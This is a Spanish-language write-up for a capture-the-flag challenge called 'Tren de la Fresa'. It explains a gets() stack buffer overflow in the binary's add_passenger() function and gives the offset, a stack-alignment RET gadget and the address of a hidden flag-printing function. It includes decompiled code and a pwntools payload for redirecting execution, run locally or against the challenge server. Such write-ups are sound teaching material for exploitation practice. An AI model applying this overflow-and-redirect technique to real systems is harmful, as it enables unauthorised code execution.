# Solución - Tren de la Fresa CTF

## Resumen de la Vulnerabilidad

El binario `tren_fresa` contiene un buffer overflow en la función `add_passenger()` que usa `gets()` sin verificar límites. La función oculta `maquinista()` lee y muestra el contenido de `flag.txt`, pero no está accesible desde el menú.

### Detalles Técnicos
- **Función vulnerable**: `add_passenger()` - Opción 1 del menú
- **Vulnerabilidad**: Buffer overflow via `gets()`
- **Buffer size**: 72 bytes
- **Objetivo**: Sobrescribir return address para saltar a `maquinista()`
- **Dirección de maquinista**: `0x401470`
- **Gadget RET**: `0x40101a` (necesario para alinear la pila en x86-64)

### Estructura del Payload
```
[72 bytes padding] + [RET gadget (0x40101a)] + [maquinista addr (0x401470)]
Total: 88 bytes
```

## Archivos Incluidos

1. **exploit.py** - Exploit principal usando pwntools (RECOMENDADO)
2. **exploit_simple.py** - Exploit sin dependencias externas (solo Python estándar)
3. **test_exploit.py** - Script para probar diferentes offsets
4. **find_offset.py** - Utilidad para encontrar offsets con patrones cíclicos

## Uso

### Opción 1: Con Pwntools (Recomendado)

#### 1. Configurar entorno virtual
```bash
python3 -m venv venv
source venv/bin/activate
pip install pwntools
```

#### 2. Ejecutar exploit localmente
```bash
python3 exploit.py
```

Resultado esperado:
```
🏁 Flag: GDG{TEST_flag_local_conecta_al_servidor_remoto}
```

#### 3. Conectar al servidor remoto
```bash
python3 exploit.py <IP_SERVIDOR> [puerto]
```

Ejemplo:
```bash
python3 exploit.py 192.168.1.100 5005
```

### Opción 2: Sin Pwntools

#### 1. Ejecutar exploit simple localmente
```bash
python3 exploit_simple.py
```

Esto creará un archivo `payload.txt` que puedes usar:
```bash
cat payload.txt | ./tren_fresa
```

#### 2. Conectar al servidor remoto
```bash
python3 exploit_simple.py <IP_SERVIDOR> [puerto]
```

## Análisis Paso a Paso

### 1. Identificación de la Vulnerabilidad

Revisando los archivos decompile*.txt, encontramos en `add_passenger()`:
```c
void add_passenger(void)
{
  char acStack_48 [72];  // Buffer de 72 bytes

  puts("Por favor, introduce el nombre completo del pasajero:");
  __printf_chk(1,&DAT_004028cd);
  fflush(stdout);
  gets(acStack_48);  // ⚠️ VULNERABLE - No hay verificación de límites!
  __printf_chk(1,&DAT_004028db,acStack_48);
  // ...
}
```

### 2. Función Objetivo

La función `maquinista()` lee la flag pero no está en el menú:
```c
int maquinista()
{
  FILE *__stream;
  // ...
  __stream = fopen("flag.txt","r");
  if (__stream != (FILE *)0x0) {
    pcVar1 = fgets(acStack_78,100,__stream);
    if (pcVar1 != (char *)0x0) {
      sVar2 = strcspn(acStack_78,"\n");
      acStack_78[sVar2] = '\0';
      __printf_chk(1,&DAT_004028be,acStack_78);  // Imprime la flag!
    }
    // ...
  }
}
```

### 3. Encontrar Direcciones

```bash
nm tren_fresa | grep maquinista
# 0000000000401470 T maquinista

ROPgadget --binary tren_fresa --only "ret"
# 0x000000000040101a : ret
```

### 4. Determinar Offset

El offset exacto es de 72 bytes hasta el return address. Esto se determinó usando patrones cíclicos de pwntools.

### 5. Construir Exploit

```python
from pwn import *

MAQUINISTA_ADDR = 0x401470
RET_GADGET = 0x40101a

payload = b'A' * 72              # Llenar buffer
payload += p64(RET_GADGET)       # Alinear pila
payload += p64(MAQUINISTA_ADDR)  # Saltar a maquinista

# Enviar opción 1, luego el payload
```

## Notas Importantes

### Alineación de Pila en x86-64

En sistemas x86-64, algunas funciones de la librería estándar (como `printf`) requieren que la pila esté alineada a 16 bytes. Por eso necesitamos el gadget RET antes de llamar a `maquinista()`.

Sin el gadget RET, obtendrás un SIGSEGV porque la pila no está correctamente alineada.

### Flag Local vs Remota

- **Flag local** (en flag.txt): `GDG{TEST_flag_local_conecta_al_servidor_remoto}`
- **Flag remota**: Se obtiene conectándose al servidor remoto en el puerto 5005

La flag local es solo para pruebas. La flag real del CTF está en el servidor remoto.

## Verificación de Seguridad

```bash
# Verificar propiedades del binario
file tren_fresa
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

# Verificar protecciones
readelf -l tren_fresa | grep GNU_STACK
# RWE - Stack ejecutable (no es necesario para este exploit)

# Verificar símbolos
nm tren_fresa | grep -E "maquinista|add_passenger"
```

## Troubleshooting

### El exploit causa SIGSEGV
- Asegúrate de usar el gadget RET para alinear la pila
- Verifica que el offset sea exactamente 72 bytes
- Comprueba que las direcciones sean correctas

### No se conecta al servidor remoto
- Verifica la IP y el puerto del servidor
- Asegúrate de que el servidor esté activo
- Comprueba la conectividad de red

### La flag no aparece
- Verifica que llegaste a ejecutar `maquinista()`
- Comprueba que el archivo flag.txt existe (en remoto)
- Revisa el output completo del exploit

## Referencias

- Código decompilado en: decompile1.txt - decompile9.txt
- Descripción del reto: datos.txt
- Documentación del codebase: ANTIGRAVITY.md
